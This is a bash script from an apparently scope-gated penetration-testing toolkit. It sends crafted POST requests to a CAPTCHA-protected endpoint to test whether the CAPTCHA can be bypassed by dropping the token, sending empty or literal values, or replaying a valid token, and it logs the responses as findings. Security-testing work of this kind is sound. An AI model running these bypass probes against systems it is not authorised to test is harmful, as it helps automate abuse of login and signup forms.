#!/usr/bin/env bash
# vuln/captcha-bypass.sh — common CAPTCHA bypass vector check.
#
# XSSRat 00x10-10. The classic bypasses:
#   1. Captcha validation client-side only — drop the captcha param
#   2. Captcha reusable — replay the same token N times
#   3. Captcha tied to session, not request — different endpoint, same token
#   4. Captcha endpoint returns success but token isn't checked downstream
#
# This script samples a captcha-gated endpoint and runs each test.

PHASE="captcha-bypass"
. "$(dirname "$0")/_lib.sh"
require_target
ensure_scope
OUTDIR=$(out_dir "$PHASE")

ENDPOINT="${ENDPOINT:-}"
[ -z "$ENDPOINT" ] && { log ERR "ENDPOINT required (the captcha-gated URL)"; exit 2; }

CAPTCHA_PARAM="${CAPTCHA_PARAM:-g-recaptcha-response}"
CAPTCHA_TOKEN="${CAPTCHA_TOKEN:-}"
BODY_TEMPLATE="${BODY_TEMPLATE:-username=test&password=test&${CAPTCHA_PARAM}=__TOKEN__}"

REPORT="$OUTDIR/findings.txt"
: > "$REPORT"

probe() {
    local name="$1"; shift
    local resp
    resp=$(curl -sS --max-time 10 -X POST "$ENDPOINT" -w 'HTTP_STATUS:%{http_code}' "$@" 2>/dev/null)
    echo "[$name] $resp"
}

log INFO "1. drop captcha param entirely"
body_no_captcha=$(echo "$BODY_TEMPLATE" | sed "s|&${CAPTCHA_PARAM}=__TOKEN__||; s|${CAPTCHA_PARAM}=__TOKEN__&||")
{ probe "drop-param" -d "$body_no_captcha"; echo; } >> "$REPORT"

log INFO "2. empty captcha value"
body_empty=$(echo "$BODY_TEMPLATE" | sed "s|__TOKEN__||")
{ probe "empty-token" -d "$body_empty"; echo; } >> "$REPORT"

log INFO "3. literal 'true' / 'false' token (some servers parse loosely)"
{ probe "token-true"  -d "$(echo "$BODY_TEMPLATE" | sed 's|__TOKEN__|true|')";  echo; } >> "$REPORT"
{ probe "token-1"     -d "$(echo "$BODY_TEMPLATE" | sed 's|__TOKEN__|1|')";     echo; } >> "$REPORT"

if [ -n "$CAPTCHA_TOKEN" ]; then
    log INFO "4. valid-token replay (10x same token in 5 seconds)"
    for i in $(seq 1 10); do
        { probe "replay-$i" -d "$(echo "$BODY_TEMPLATE" | sed "s|__TOKEN__|$CAPTCHA_TOKEN|")"; echo; } >> "$REPORT"
    done
fi

# Parse the report — any HTTP 200 in a row where we dropped/empty/replayed = bypass
log INFO "captcha-bypass done — review $REPORT"
log INFO "  rule of thumb: 200 + redirect to dashboard = bypass; 400/422/403 = gate held"
